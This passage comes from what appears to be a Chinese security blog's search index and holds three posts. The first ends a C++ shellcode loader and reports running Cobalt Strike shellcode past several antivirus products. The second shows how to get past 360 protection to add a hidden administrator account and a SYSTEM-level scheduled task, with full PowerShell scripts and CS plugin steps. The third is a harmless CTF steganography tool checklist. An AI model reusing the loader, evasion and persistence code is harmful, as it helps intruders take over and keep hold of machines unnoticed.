<span class="comment">//定义文件内容的字节数</span></span><br><span class="line">	string contents; <span class="comment">//定义文件内容</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断文件是否打开成功</span></span><br><span class="line">	<span class="keyword">if</span> (file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">		std::stringstream buffer; <span class="comment">//创建一个stringstream对象</span></span><br><span class="line">		buffer &lt;&lt; file.<span class="built_in">rdbuf</span>();  <span class="comment">//将文件的内容复制到该流中</span></span><br><span class="line">		contents = buffer.<span class="built_in">str</span>();  <span class="comment">//将stringstream对象的内容转换string,并将其存储在contents中</span></span><br><span class="line"></span><br><span class="line">		size = contents.<span class="built_in">length</span>() / <span class="number">2</span>;  <span class="comment">//由于两个十六进制相当于一个字节,因此文件内容长度需除以2</span></span><br><span class="line">		file.<span class="built_in">close</span>();  <span class="comment">//关闭文件</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 为shellcode申请一块内存</span></span><br><span class="line">	shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用函数将十六进制字符串转换为字节型数组</span></span><br><span class="line">	<span class="built_in">hexStringToBytes</span>(contents, (<span class="type">unsigned</span> <span class="type">char</span> *)shellcode_addr, size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改内存属性为可读写</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 执行shellcode</span></span><br><span class="line">	(*(<span class="built_in">int</span>(*)()) shellcode_addr)();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 解除Hook</span></span><br><span class="line">	<span class="built_in">UnHook</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>打开Cobalt Strike生成Raw格式的shellcode文件，注意要选择Stageless</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621224537305.png" alt="image-20230621224537305">	</p>
<p>使用<code>BinToHex.py</code>将bin文件转为存放16进制字符串的文本文件，并将其与可执行文件放在同一目录</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621224842193-16873589242881.png" alt="image-20230621224842193">	</p>
<p>运行可执行程序后，cs成功显示上线，数字杀软也没有报毒，在程序的控制台输出可以看到，分配了两段内存，第一段内存是为储存shellcode分配的，第二段是执行shellcode后它自己分配的，后续会将第一段内存给释放掉，然后修改第二段内存的属性来绕过杀软</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621225435343.png" alt="image-20230621225435343"></p>
<p>我测试了下，某绒和数字杀软都能上线并执行命令，卡巴斯基之前是可以过的，但现在不行了。WindowsDefend也能上线，但是第二次回连被检测出了CS流量特征，以下是VT的杀毒查杀率</p>
<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621230053519.png" alt="image-20230621230053519">	</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><p><a href="https://forum.butian.net/share/783">https://forum.butian.net/share/783</a>	</p>
</li>
<li><p><a href="https://xz.aliyun.com/t/9399">https://xz.aliyun.com/t/9399</a></p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通常情况下直接执行cmd命令来添加用户或者计划任务都会被杀软拦截，我总结两种方法来绕过杀软的检测，分别是调用Windows Api(编写CS bof)或者执行Powershell脚本(通过模拟powershell环境的程序来执行)</p>
<h1 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h1><h2 id="拦截情景"><a href="#拦截情景" class="headerlink" title="拦截情景"></a>拦截情景</h2><p>在开启360核晶模式的环境下，在UI界面执行添加用户的命令都会被拦截</p>
<img src="绕杀软添加计划任务/image-20230719165242670.png" alt="image-20230719165242670" style="zoom:67%;" />	



<p>更别说是在beacon命令行界面执行添加用户命令了，这里我分别尝试使用shell命令和run命令来添加用户，均被核晶拦截了</p>
<blockquote>
<p><code>shell</code>命令：此命令允许你执行Windows命令提示符（cmd.exe）中的任何命令。执行的命令将在命令提示符中运行，并将其输出返回给CobaltStrike。这是一个交互式命令，意味着你可以在输出返回后立即输入下一个命令</p>
<p><code>run</code>命令：此命令用于在新的进程中运行程序或命令。与<code>shell</code>命令不同，它只是启动新的进程并返回。</p>
</blockquote>
<img src="绕杀软添加计划任务/image-20230719172245374.png" alt="image-20230719172245374" style="zoom:67%;" />	

<img src="绕杀软添加计划任务/image-20230719172254551.png" alt="image-20230719172254551" style="zoom:67%;" />			



<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="1-CS-bof"><a href="#1-CS-bof" class="headerlink" title="1.CS bof"></a>1.CS bof</h3><p>在Windows API中，有一些函数用于处理网络用户和本地组的管理。<code>NetUserAdd()</code> 函数用于在一个服务器上创建一个新用户，而 <code>NetLocalGroupAdd()</code> 函数可以用于在一个本地服务器上创建一个新的用户组</p>
<p>此CS插件整合了添加用户的API，并通过反射dll注入的方式实现无文件落地执行，github项目地址：<a href="https://github.com/crisprss/BypassUserAdd">https://github.com/crisprss/BypassUserAdd</a></p>
<p>首先确定beacon进程拥有system权限，这里我使用此插件添加用户的第一个方法<code>Reflection NetUserAdd</code>，随后输入添加用户名及密码</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719173255080.png" alt="image-20230719173255080">		</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719173506171.png" alt="image-20230719173506171">	</p>
<p>运行成功后在beacon命令行会提示</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719173601290.png" alt="image-20230719173601290"></p>
<p>核晶全程没有查杀，cmd命令行输入<code>net user</code>可以发现user4用户添加成功了</p>
<img src="绕杀软添加计划任务/image-20230719173723893.png" alt="image-20230719173723893" style="zoom:67%;" />



<h3 id="2-Powershell脚本"><a href="#2-Powershell脚本" class="headerlink" title="2.Powershell脚本"></a>2.Powershell脚本</h3><p>以下是添加用户的Powershell脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用管理员权限运行此脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义新用户的用户名和密码</span></span><br><span class="line"><span class="variable">$userName</span> = <span class="string">&quot;NewUser&quot;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Password123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建本地用户账户</span></span><br><span class="line"><span class="built_in">New-LocalUser</span> <span class="literal">-Name</span> <span class="variable">$userName</span> <span class="literal">-Password</span> <span class="variable">$password</span> <span class="literal">-FullName</span> <span class="string">&quot;New User&quot;</span> <span class="literal">-Description</span> <span class="string">&quot;This is a new user.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加新用户到 &quot;Users&quot; 组</span></span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Administrators&quot;</span> <span class="literal">-Member</span> <span class="variable">$userName</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出创建的用户信息</span></span><br><span class="line"><span class="built_in">Get-LocalUser</span> <span class="literal">-Name</span> <span class="variable">$userName</span></span><br></pre></td></tr></table></figure>



<p>以下是执行powershell脚本的效果图：</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230721145437347.png" alt="image-20230721145437347"></p>
<p>​	</p>
<h1 id="添加计划任务"><a href="#添加计划任务" class="headerlink" title="添加计划任务"></a>添加计划任务</h1><h2 id="拦截情景-1"><a href="#拦截情景-1" class="headerlink" title="拦截情景"></a>拦截情景</h2><p>beacon命令行执行shell命令来添加计划任务，直接被核晶拦截</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn &quot;My Task&quot; /tr &quot;C:\MyApp.exe&quot; /sc daily /st 10:00</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719204529199.png" alt="image-20230719204529199"></p>
<h2 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="1-CS-bof-1"><a href="#1-CS-bof-1" class="headerlink" title="1.CS bof"></a>1.CS bof</h3><p>在Windows api中，你可以使用 Task Scheduler （任务计划程序）API 来创建和管理计划任务。任务计划程序 API 是一组 COM 接口，你可以通过各种编程语言（如 C++，C#，VBScript 等）来使用它</p>
<p>CobaltStrike有个叫Bof的功能，它允许你使用C语言来扩展Beacon的功能，运行时可以直接加载到内存中并执行，因此可以通过编写创建计划任务的bof来绕过一些杀软的检测	此处github上有现成的项目：<a href="https://github.com/yanghaoi/CobaltStrike_CNA">https://github.com/yanghaoi/CobaltStrike_CNA</a>	</p>
<p>加载github项目的插件后，鼠标右键上线会话，<code>Persistence</code>-&gt;<code>计划任务</code>-&gt;<code>Add-TaskAPI</code>, 通过调用Windows API来添加计划任务</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719212549620.png" alt="image-20230719212549620"></p>
<p>设置添加计划任务的详细信息</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719212712261.png" alt="image-20230719212712261">	</p>
<p>添加计划任务后, 会在Beacon命令行提示任务创建成功</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719212734715.png" alt="image-20230719212734715"></p>
<p>查看目标主机的计划任务列表，可以看到计划任务添加成功了，并且360核晶全程没有报毒</p>
<img src="绕杀软添加计划任务/image-20230719212935726.png" alt="image-20230719212935726" style="zoom:67%;" />	



<h3 id="2-PowerShell脚本"><a href="#2-PowerShell脚本" class="headerlink" title="2.PowerShell脚本"></a>2.PowerShell脚本</h3><p>配合模拟powershell环境的可执行程序执行ps1脚本，以此实现添加计划任务，如下是添加计划任务的ps1脚本代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义任务的名称、要运行的程序和参数、描述信息</span></span><br><span class="line"><span class="variable">$taskName</span> = <span class="string">&quot;\Explorer\test1&quot;</span></span><br><span class="line"><span class="variable">$programPath</span> = <span class="string">&quot;C:\Path\To\Your\Program\MyProgram.exe&quot;</span></span><br><span class="line"><span class="variable">$programArgs</span> = <span class="string">&quot;base64&quot;</span></span><br><span class="line"><span class="variable">$taskDescription</span> = <span class="string">&quot;This is a scheduled task running a program daily at 12:00 PM.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果任务已经存在，先删除</span></span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.TaskName <span class="operator">-eq</span> <span class="variable">$taskName</span> &#125;) <span class="operator">-ne</span> <span class="variable">$null</span>) &#123;</span><br><span class="line">    <span class="built_in">Unregister-ScheduledTask</span> <span class="literal">-TaskName</span> <span class="variable">$taskName</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定触发器</span></span><br><span class="line"><span class="variable">$trigger</span> = <span class="built_in">New-ScheduledTaskTrigger</span> <span class="literal">-Daily</span> <span class="literal">-At</span> <span class="number">17</span>:<span class="number">56</span>pm  <span class="comment">#在每天的12:00 PM运行任务</span></span><br><span class="line"><span class="comment">#$trigger = New-ScheduledTaskTrigger -AtStartup       #在每次启动时运行任务</span></span><br><span class="line"><span class="comment">#$trigger = New-ScheduledTaskTrigger -AtIdle          #在系统空闲时运行任务 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定任务的操作，即要运行的程序和参数</span></span><br><span class="line"><span class="variable">$action</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-Execute</span> <span class="variable">$programPath</span> <span class="literal">-Argument</span> <span class="variable">$programArgs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个以系统权限运行的计划任务</span></span><br><span class="line"><span class="variable">$principal</span> = <span class="built_in">New-ScheduledTaskPrincipal</span> <span class="literal">-UserID</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="literal">-LogonType</span> ServiceAccount <span class="literal">-RunLevel</span> Highest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建计划任务</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-TaskName</span> <span class="variable">$taskName</span> <span class="literal">-Trigger</span> <span class="variable">$trigger</span> <span class="literal">-Action</span> <span class="variable">$action</span> <span class="literal">-Principal</span> <span class="variable">$principal</span> <span class="literal">-Description</span> <span class="variable">$taskDescription</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的计划任务</span></span><br><span class="line"><span class="comment"># $taskToDelete = &quot;\Explorer\test2&quot;</span></span><br><span class="line"><span class="comment"># if((Get-ScheduledTask | Where-Object &#123; $_.TaskName -eq $taskToDelete &#125;) -ne $null) &#123;</span></span><br><span class="line">    <span class="comment"># Unregister-ScheduledTask -TaskName $taskToDelete -Confirm:$false</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br></pre></td></tr></table></figure>



<p>运行效果如下图所示：</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230721150156077.png" alt="image-20230721150156077">						</p>
]]></content>
  </entry>
  <entry>
    <title>隐写总结</title>
    <url>/2023/05/31/%E9%9A%90%E5%86%99%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="1-总结"><a href="#1-总结" class="headerlink" title="1 总结"></a>1 总结</h1><ol>
<li><font color=red>图片属性一定要看的，题目给的提示有可能是误导，这点要自己判断. 即使是string看不到，也要手工看下，结果不一样</font></li>
<li><font color=red>图片放kali</font>,会自动根据文件头识别文件类型</li>
<li>strings 查看有无特殊字符串 <code>strings -f xxx | egrep -i &quot;flag|key|pass|sec|base|Zmxh|==&quot;</code></li>
<li>strings <font color=red> | more 需要观察的都要仔细看</font></li>
<li><font color=red>binwalk(u18)</font>检查图片中有无隐藏内容  </li>
<li><font color=red>foremost(u18)</font>检查有无隐写，一般需要在kali中提前安装<code>sudo apt-get install foremost</code>，windows备用搜索关键字  </li>
<li><font color=red>stegsolv</font>导出常见通道格式基本固定，<font color=red>遇到PNG和BMP图片，可以使用zsteg快速分析</font>，命令<code>zsteg -a xx.png</code>，其他图片还是用手工<font color=red>手工效率低下，是下下之选</font>。利用zsteg工具直接导出数据的命令<code>zsteg -e b1,rgb,lsb,xy    题目.png &gt; out.zip</code>。一般会在某个通道看到不一样的图像，其中一种见示例203_Misc-GreatWall</li>
<li><font color=red>两张图片一模一样</font>，考虑三种：（1）两个图片某些像素不同，通过这些像素进行异或，相加等操作得到新的图片；使用Stegsolve1.3版本的combiner功能计算两个图片的各类组合（2）使用blindwatermark工具 <code>python2 bwm.py decode 1.png 2.png 1122.png</code>  </li>
<li><font color=red>多张图片，要么一模一样，要么有特征规律（比如像素）</font>,使用Stegsolve1.3版本的combiner功能计算两个图片的各类组合，按照特征规律进行拼图<br>——————————–分隔——————————————</li>
<li><font color=red>GIF</font>分离很多图片，虽然不会使用python对图片进行识别，但可以通过文件大小排序快速分类</li>
<li>zsteg可以检测<font color=red>PNG</font>和<font color=red>BMP</font>图片里的隐写数据，在ubuntu18中已安装，先使用zsteg filename，观察有无可见字符，最后用zsteg -a file ：运行给定文件上的所有方法，仔细观察，特别是4&#x2F;5&#x2F;6&#x2F;7开头的两位十六进制码  </li>
<li>看到<font color=red>PNG</font>要想到修改文件的高度与宽度。新方法：再x64中everything查找“png_height_width_fix.py”，通杀改高、改宽；老方法：修改第二行的第8位数字，那里是图片的高度。如还不行，可以考虑等比例放大，即将第二行的前4位数字double，5-8位数字double。</li>
<li>看到<strong>BMP</strong>可以考虑高度，位置与PNG类似，<strong>但是结构不一样</strong>，宽度662， 十六进制0x296，图片保存格式为  00 00 96 02 ， 类似大小端</li>
<li>还有<strong>JPG</strong>高度修改，使用010比较便捷。010路径：struct SOFx sof0 - WORD Y_image</li>
<li><font color=red>PNG</font>隐写-IDAT，使用pngcheck.exe -v idat.png，一般针对大图片。如果有 IDAT 还没填满（填满6万多）就填充了下一个就要考虑是不是有问题。[[PNG-IDAT隐写]]</li>
<li>目前了解，针对<font color=red>PNG</font>和<font color=red>JPG</font>，cloacked图片加密隐写，需要密码。<code>python2 lsb.py extract VALORANT.png output.jpg password</code>   密码如果不提供，一般为123456，或者文件名、或者题目名</li>
<li>看到<font color=red>JPG</font>，还可以考虑使用steghide，<font color=red>优先考虑在u18上使用吧</font>。<code>steghide.exe  extract -sf good-已合并.jpg</code>。还可以考虑stegdetect。<code>stegdetect.exe -tjopi -s 10.0 hide.jpg</code>。还可以考虑使用stegbreak。<code>stegbreak.exe -r rules.ini -f password.dic -t p hide.jpg</code> </li>
<li>对于jpg图片，是否提示与outguess有关，u18已安装  </li>
<li>对于jpg图片，先使用SilentEye试试</li>
<li>identify 1. ——————————–分隔–其他隐写——————————————</li>
<li>看到base64，如果解码不正常，最后实在不行考虑下base64隐写<code>base64_stego</code>  </li>
<li>F5隐写，u18\003-Misc\F5-stegxx，使用方法<code>java Extract Misc.jpg</code>，输出结果在<code>output.txt</code>中，可以<code>file output.txt</code>核实文件类型</li>
<li>基于空格和制表符的隐写，<code>SNOW.exe -p password filename</code></li>
<li>未知的文件格式，通常关注文件头的格式，同时也要注意文件尾的格式。详见<strong>各类文件特征总结</strong></li>
<li>word文件可以通过修改后缀的方式解压缩</li>
<li>doc隐写，本机的doc已经修改<code>选项、显示、隐藏文字</code>;修改后缀为zip，解压缩有用find xargs搜索。</li>
<li>PDF可以通过x64虚拟机中安装的Foxit PhantomPDF打开，或者右键选择使用wps pdf编辑功能</li>
<li>pyc隐写<code>python3 stegosaurus.py -x flag.pyc</code></li>
<li>conf.bin文件用工具routerpassview 打开，注意搜索宽带账号和宽带密码</li>
<li>MP3隐写：MP3stego需要猜测密码，<code>decode -X -P pass svega_stego.mp3</code></li>
<li>WAV隐写：SilentEye工具直接打开看看</li>
<li>MP3、wav隐写：使用audacity软件分析音频是，注意切换<strong>波形</strong> 和 <strong>频谱图</strong>，<strong>调整频谱增益</strong>，看得更清楚；也可以用软件Adobe Audition CS6打开，Shift + D切换两个视图</li>
<li>如果音乐能正常播放，大概率是在音乐头部和尾部增加了内容，注意放大观察头尾</li>
<li>wav隐写：audacity软件可以对音频进行剪裁（剪刀图标），dtmf2num.exe在识别时，需要比较纯净的音频。</li>
<li>wav隐写：SilentEye软件直接打开后按decode</li>
<li>wav隐写：MMSSTV结合虚拟声卡，播放一下；u16上安装的robot36工具，<code>decode &#39;Can you hear.wav&#39;</code>，ppm文件用ps可以打开。</li>
<li>01格式的编码可能是二进制编码，也可能是摩斯码。关注长度是否是平方数，可否转换二维码。参考PNG IDAT隐写的例子</li>
</ol>
<h1 id="2-如果都尝试过没有思路，看看本文档的附件ppt"><a href="#2-如果都尝试过没有思路，看看本文档的附件ppt" class="headerlink" title="2 如果都尝试过没有思路，看看本文档的附件ppt"></a>2 如果都尝试过没有思路，看看本文档的附件ppt</h1><p>![[杂项.pptx]]</p>
]]></content>
  </entry>
</search>
